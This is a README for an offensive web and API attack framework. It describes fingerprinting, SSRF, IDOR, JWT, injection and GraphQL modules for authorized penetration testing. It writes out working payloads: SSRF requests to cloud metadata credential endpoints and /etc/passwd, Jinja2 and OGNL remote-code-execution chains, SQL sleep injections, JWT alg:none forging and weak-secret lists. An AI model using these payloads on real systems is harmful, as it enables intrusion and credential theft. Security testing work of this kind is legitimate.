# Sentinel — Offensive Web & API Attack Framework

> **Fingerprint the stack, inject into every parameter layer, forge JWTs, exfiltrate via SSRF to cloud metadata, enumerate IDOR across ID ranges, and tear through GraphQL schemas — one engagement context, six attack modules.**

---

## Threat Model

Modern web applications are attacked at the logic layer, not the network layer. WAFs filter payloads. CDNs absorb volumetric attacks. But authorization logic, parameter handling, and API gateway configuration are still written by developers who trust their own assumptions about what users will send.

Sentinel models the attacker who probes those assumptions:

| Stage | What Fails | Adversary Action |
|---|---|---|
| **Reconnaissance** | `Server`, `X-Powered-By`, and `X-Debug-Token` headers leak stack versions | Fingerprint framework (Laravel, Spring, Django, Express), detect WAF vendor and bypass strategy |
| **SSRF** | Internal API calls use user-supplied URLs without scheme/host allow-listing | Probe 28 parameter names; reach AWS IMDSv1/v2, Azure IMDS, GCP metadata, Kubernetes API, Redis via gopher://, SMTP via gopher://, internal hosts |
| **IDOR** | Authorization checks on object access are missing or client-side | Enumerate IDs ±20 from authenticated ID; swap UUID formats; test vertical escalation from `/user/` to `/admin/` |
| **Authentication** | JWTs validated without algorithm enforcement; weak HS256 secrets | Forge `alg:none` tokens in 4 encoding variants; brute 15 common HS256 secrets; detect RS256 algorithm confusion opportunity |
| **Injection** | SQL parameters not parameterized; NoSQL operators accepted in JSON; template engines render user input | Time-based blind SQLi (MySQL SLEEP, MSSQL WAITFOR, PostgreSQL pg_sleep); NoSQL `$gt`/`$ne` operator injection; SSTI Jinja2/OGNL RCE chains |
| **GraphQL** | Introspection not disabled in production; batching allows rate limit bypass; depth limits absent | Full schema introspection; sensitive mutation detection; 19-query batch for rate limit bypass; query depth DoS |

**Scope:** Authorized web application penetration testing, API security assessments, and bug bounty engagements.

---

## Why This Exists

OWASP Top 10 tools are abundant. Tools that test one vulnerability class in isolation are everywhere. What is rare is a framework that chains the attack narrative: the fingerprint drives the injection strategy; the SSRF finding extracts cloud credentials; the JWT forge bypasses authorization on the IDOR endpoint.

Sentinel is built around `EngagementSession` — a `requests.Session` with retry adapter that carries cookies, headers, and discovered tokens from one module to the next. The JWT extracted in the auth module is the same token used to probe IDOR endpoints. The cloud credentials exfiltrated via SSRF flow into the engagement report alongside the SQL injection finding from the same target.

---

## Capabilities

### Fingerprinting & Stack Analysis
- Server header extraction — version disclosure from `Server`, `X-Powered-By`, `X-Generator`, `X-Debug-Token`
- Framework detection via response patterns: Laravel (debug page), Django (`csrfmiddlewaretoken`), Rails (`_rails_`), Express (`express`), Spring Boot (`Whitelabel Error`), WordPress (`wp-content`), Struts2 (`struts2`)
- **WAF fingerprinting** — detect Cloudflare, AWS WAF, Akamai, F5 BIG-IP, Incapsula, ModSecurity, Sucuri, Barracuda from response headers and body patterns
- **API endpoint discovery** — probe 30+ standard paths: `/actuator/env`, `/actuator/heapdump`, `/graphql`, `/graphiql`, `/swagger-ui.html`, `/api-docs`, `/.well-known/jwks.json`, `/admin`, `/internal`, `/debug`, `/metrics`, and more
- **CORS misconfiguration** — test reflected `Origin` header with `credentials: include`; flag full trust with credentials
- **Security header audit** — check for missing `Content-Security-Policy`, `X-Frame-Options`, `X-Content-Type-Options`, `Strict-Transport-Security`, `Permissions-Policy`

### SSRF Exploitation

28 parameter names probed per endpoint (`url`, `redirect`, `callback`, `next`, `dest`, `path`, `host`, `proxy`, `fetch`, `load`, `link`, `src`, `uri`, `endpoint`, `forward`, `navigate`, `open`, `ref`, `return`, `site`, `target`, `to`, `file`, `resource`, `continue`, `domain`, `out`, `data`).

Probe targets:
- AWS IMDSv1: `http://169.254.169.254/latest/meta-data/iam/security-credentials/`
- AWS IMDSv2: PUT token → GET credentials via `X-aws-ec2-metadata-token`
- Azure IMDS: `http://169.254.169.254/metadata/instance` with `Metadata: true`
- GCP metadata: `http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token`
- Kubernetes API: `https://kubernetes.default.svc/api/v1/namespaces`
- Internal hosts: `http://localhost`, `http://127.0.0.1`, common internal ranges
- Protocol handlers: `file:///etc/passwd`, `file:///proc/environ`, `dict://redis:6379/INFO`, `gopher://smtp:25/`

**9 IP address bypass encodings** per probe:
- Raw (`127.0.0.1`)
- xip.io wildcard (`127.0.0.1.xip.io`)
- Octal (`0177.0000.0000.0001`)
- Hexadecimal (`0x7f000001`)
- Decimal (`2130706433`)
- IPv6 (`::1`, `[::1]`)
- User@host (`http://attacker@127.0.0.1`)
- Case variant (`http://LocalHost`)
- Triple slash (`file:///etc/passwd`)

GET and POST (JSON body, form-encoded, XML) tested per parameter.

**Auto-extraction:** if AWS IMDS role list is returned, automatically retrieve full credentials in the same request chain.

### IDOR Enumeration
- **Path-based IDOR** — extract numeric ID from URL path; probe ±20 adjacent IDs and 5 random UUIDs; compare response size/status to detect unauthorized object access
- **Parameter-based IDOR** — probe `id`, `user_id`, `account_id`, `object_id`, `resource_id` query parameters
- **Vertical privilege escalation** — replace `/user/`, `/account/`, `/profile/` path segments with `/admin/`, `/administrator/`, `/superuser/`; compare response codes
- **Mass assignment** — PUT request with elevated fields: `role`, `is_admin`, `permissions`, `user_type`, `access_level`; detect success via response delta

### Authentication Attack Module

**JWT:**
- `alg:none` forging — 4 encoding variants (none, None, NONE, nOnE) with original payload and injected `role:admin`
- HS256 weak secret brute-force — 15 common secrets: `secret`, `password`, `key`, `123456`, `jwt_secret`, `mysecret`, `changeme`, `admin`, `token`, `api_key`, `private`, `app_secret`, `default`, `test`, `dev`
- RS256 algorithm confusion detection — flag RS256 tokens and note public key reuse as HS256 secret opportunity
- Sensitive claim extraction — flag tokens containing `role`, `admin`, `is_admin`, `permission`, `scope`, `group`

**Session:**
- Session fixation detection — compare session token before and after authentication

**OAuth:**
- `redirect_uri` bypass — test 5 evil redirect variants: appended path, parameter pollution, open-redirect chaining, subdomain variant, scheme variation
- Missing `state` parameter detection — CSRF in OAuth flow

**Client-side secret scanning:**
- Scan all JavaScript bundles loaded by the target page for: AWS Access Key, Google API Key, GitHub PAT, OpenAI key, generic `apiKey`, `secret`, `token` patterns

### Injection Module

**SQL Injection:**
- Error-based detection — test for MySQL, MSSQL, Oracle, PostgreSQL error messages in response
- Time-based blind — MySQL: `SLEEP(5)`, MSSQL: `WAITFOR DELAY '0:0:5'`, PostgreSQL: `pg_sleep(5)`; measure response delta
- UNION-based extraction — fuzz column count (1-10), extract `@@version`/`version()` via confirmed column count
- GET parameters and POST body (form + JSON)

**NoSQL Injection:**
- MongoDB operator injection — `$gt`, `$ne`, `$exists`, `$regex` in both GET query string and JSON POST body
- Test against `/api/users/login` and similar auth endpoints

**SSTI:**
- Detection payloads: `{{7*7}}`, `${7*7}`, `<%= 7*7 %>`, `#{7*7}`, `*{7*7}`
- Jinja2 RCE chain: `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}`
- OGNL RCE chain: `${Runtime.exec('id')}`

### GraphQL Attack Module
- **Full schema introspection** — `__schema` query for all types, fields, mutations, and subscriptions
- **Sensitive mutation detection** — flag mutations containing `delete`, `admin`, `grant`, `privilege`, `user`, `password`, `role`
- **Introspection bypass probes** — alternative introspection queries for partially-disabled introspection
- **Batching attack** — send 19 queries in a single array body to test rate limiting enforcement
- **GraphQL injection** — variable injection into `$input` and `$id` parameters
- **Query depth DoS detection** — send deeply nested query; flag if not rejected

---

## Architecture

```
Target (URL · headers · session cookies)
               │
               ▼
       EngagementSession
  ┌──────────────────────────────────┐
  │  requests.Session + retry        │
  │  discovered tokens · cookies     │
  │  JWT · SSRF results              │
  └──────────────────────────────────┘
               │
    ┌──────────┼──────────┐
    ▼          ▼          ▼
 Fingerprint  SSRF      IDOR
 Module       Module    Module
 stack+WAF    28 params ±20 IDs
 headers      9 bypass  vertical
               │         │
               ▼         ▼
          AuthModule  InjectModule
          JWT/OAuth   SQL/NoSQL/SSTI
          secret scan blind/UNION/RCE
                    │
                    ▼
             GraphQLModule
             schema + batch
             depth + inject
                    │
                    ▼
              JSON Report
          (module · vuln · severity)
```

---

## Attack Flow

1. **Fingerprint** — send initial request to target; extract headers; detect framework, WAF vendor, and exposed API paths; identify CORS and missing security headers
2. **SSRF probe** — fuzz all 28 SSRF-prone parameter names across all discovered API endpoints; apply 9 bypass encodings per probe; detect IMDS response patterns and auto-extract credentials if found
3. **JWT analysis** — extract JWT from auth flow; decode header and payload; attempt `alg:none` with 4 variants; brute HS256 with 15 common secrets; scan JS bundles for API keys and tokens
4. **IDOR sweep** — extract object IDs from authenticated responses; probe ±20 adjacent IDs; test UUID swap; attempt path-level vertical escalation; mass assignment PUT
5. **Injection** — fuzz all GET parameters and POST body fields for SQL error patterns; time-based blind SQLi with delta measurement; NoSQL operator injection; SSTI detection followed by RCE payload if detection succeeds
6. **GraphQL** — run full introspection; parse schema for sensitive mutations; execute batch attack; test depth limits
7. **Report** — `--output report.json` with module, vulnerability class, parameter, payload, response evidence, and severity

---

## Usage

```bash
# Install dependencies
pip install -r requirements.txt

# Full stack fingerprint
python sentinel.py --target https://api.target.com --modules fingerprint

# SSRF probe with bypass encodings
python sentinel.py --target https://api.target.com --modules ssrf

# IDOR enumeration with authenticated session
python sentinel.py --target https://api.target.com --modules idor \
  --header "Authorization: Bearer eyJ..."

# JWT attacks — forge alg:none, brute HS256
python sentinel.py --target https://api.target.com --modules auth \
  --token "eyJhbGciOiJIUzI1NiJ9..."

# SQL + NoSQL + SSTI injection across all parameters
python sentinel.py --target https://api.target.com --modules inject

# GraphQL introspection + batch attack
python sentinel.py --target https://api.target.com/graphql --modules graphql

# Full engagement
python sentinel.py --target https://api.target.com --modules all \
  --header "Authorization: Bearer eyJ..." \
  --output api-findings.json

# Non-interactive mode
python sentinel.py --target https://api.target.com --modules all --yes --output results.json
```

---

## Output

```
17:22:10 [INFO]  [Fingerprint] Server: nginx/1.24.0 | Framework: Laravel 10.x
17:22:10 [CRIT]  [Fingerprint] WAF: None detected — no bypass required
17:22:11 [INFO]  [Fingerprint] Endpoints: /api-docs, /actuator/env, /graphql
17:22:11 [CRIT]  [Fingerprint] CORS: Origin reflected with credentials:true — full trust misconfiguration

17:22:12 [CRIT]  [SSRF] Hit on param=redirect | Payload: http://169.254.169.254/latest/meta-data/
17:22:12 [CRIT]  [SSRF/AWS] Role detected: ec2-app-role — retrieving credentials
17:22:12 [CRIT]  [SSRF/AWS] AccessKeyId=ASIA... SecretAccessKey=... SessionToken=...

17:22:13 [CRIT]  [IDOR] ID substitution success: /api/v1/users/1843 → /api/v1/users/1841 (200 OK, 2.1KB)
17:22:13 [CRIT]  [IDOR/Vertical] /api/v1/user/profile → /api/v1/admin/profile (200 OK)

17:22:14 [CRIT]  [Auth/JWT] alg:none accepted — role:admin forged token accepted by /api/v1/admin
17:22:14 [CRIT]  [Auth/JWT] HS256 secret cracked: secret="mysecret"

17:22:15 [CRIT]  [Inject/SQL] Time-based blind confirmed: param=search | SLEEP(5) → 5.3s delta
17:22:15 [CRIT]  [Inject/SSTI] Jinja2 RCE chain successful: {{config.__class__...}} → uid=www-data

17:22:16 [CRIT]  [GraphQL] Introspection enabled — 23 types, 8 mutations exposed
17:22:16 [CRIT]  [GraphQL] Sensitive mutation: deleteUser, grantAdminRole
17:22:16 [CRIT]  [GraphQL] Batch attack: 19 queries accepted — rate limiting absent

[✓] API assessment complete — 11 critical findings | report: api-findings.json
```

---

## MITRE ATT&CK Coverage

| Technique | ID | Module |
|---|---|---|
| Exploit Public-Facing Application | T1190 | InjectModule, SSRFModule |
| Unsecured Credentials: Cloud Instance Metadata API | T1552.005 | SSRFModule |
| Steal Application Access Token | T1528 | AuthModule |
| Exploitation for Privilege Escalation | T1068 | IDORModule, AuthModule |
| Data from Information Repositories | T1213 | GraphQLModule, IDORModule |
| Gather Victim Network Information | T1590 | FingerprintModule |
| Forge Web Credentials | T1606 | AuthModule (JWT forge) |

**Tactics:** TA0001 Initial Access · TA0006 Credential Access · TA0004 Privilege Escalation · TA0009 Collection · TA0007 Discovery

---

## CWE Coverage Exercised

| CWE | Description | Where |
|---|---|---|
| CWE-918 | Server-Side Request Forgery | SSRFModule |
| CWE-89 | SQL Injection | InjectModule |
| CWE-94 | Code Injection (SSTI) | InjectModule |
| CWE-639 | Authorization Bypass Through User-Controlled Key | IDORModule |
| CWE-347 | Improper Verification of Cryptographic Signature | AuthModule (alg:none) |
| CWE-345 | Insufficient Verification of Data Authenticity | AuthModule (JWT secrets) |
| CWE-942 | Overly Permissive CORS Policy | FingerprintModule |
| CWE-770 | Allocation of Resources Without Limits (DoS) | GraphQLModule (depth/batch) |

---

## Legal Notice

Sentinel is designed exclusively for authorized penetration testing, API security assessments, and bug bounty programs where the target organization has granted explicit written permission to test. Unauthorized testing of web applications or APIs is illegal under computer fraud laws in most jurisdictions. The author assumes no liability for misuse.
